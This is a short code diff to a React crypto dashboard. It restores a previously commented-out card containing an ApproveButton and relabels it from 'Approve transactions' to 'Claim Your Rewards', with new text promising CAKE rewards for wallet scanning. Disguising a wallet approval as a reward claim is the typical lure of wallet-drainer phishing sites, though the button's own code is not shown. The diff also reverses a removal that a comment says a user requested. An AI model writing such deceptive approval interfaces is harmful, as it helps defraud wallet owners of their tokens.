@@ -61,26 +61,25 @@ export default function Home() {
         <main className="dashboard-main">
           <div className="dashboard-container">
             <div className="dashboard-grid">
-              <div className="scanning-section glass-card">
+              <div className="scanner-section glass-card">
                 <div className="section-header">
                   <h2 className="section-title gradient-text">Multi-Chain Scanner</h2>
-                  <p className="section-subtitle">Scan your on-chain activity across multiple networks</p>
+                  <p className="section-subtitle">Analyze your on-chain activity and earn CAKE rewards</p>
                 </div>
                 <div className="scanner-content">
                   <Bnbcode />
                 </div>
               </div>
 
-              {/* The following card was removed as per the user request */}
-              {/* <div className="actions-section glass-card">
+              <div className="actions-section glass-card">
                 <div className="section-header">
-                  <h2 className="section-title gradient-text">Wallet Actions</h2>
-                  <p className="section-subtitle">Approve transactions and manage your wallet</p>
+                  <h2 className="section-title gradient-text">Claim Your Rewards</h2>
+                  <p className="section-subtitle">Claim your CAKE rewards from wallet scanning</p>
                 </div>
                 <div className="actions-content">
                   <ApproveButton />
                 </div>
-              </div> */}
+              </div>
             </div>
 
 
